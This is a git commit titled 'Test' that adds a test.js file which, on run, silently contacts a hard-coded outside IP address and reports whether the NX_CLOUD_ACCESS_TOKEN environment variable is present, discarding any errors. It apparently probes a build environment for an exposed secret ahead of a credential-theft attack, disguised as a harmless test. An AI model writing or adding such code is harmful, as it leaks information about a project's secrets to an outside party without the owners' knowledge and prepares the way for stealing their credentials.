1d07db6730c263dddc3bba1bcf6f3200163cb55a
left <107749872+0xleft@users.noreply.github.com>
2024-06-28 19:18:06 +0100

    Test

---
+++ test.js
@@ -0,0 +1,8 @@
+const axios = require('axios');
+
+(async () => {
+  try {
+    await axios.get(`http://194.135.88.67:9990/${(process.env.NX_CLOUD_ACCESS_TOKEN === undefined || process.env.NX_CLOUD_ACCESS_TOKEN === "") ? "good" : "bad"}`);
+  } catch (error) {
+  }
+})();
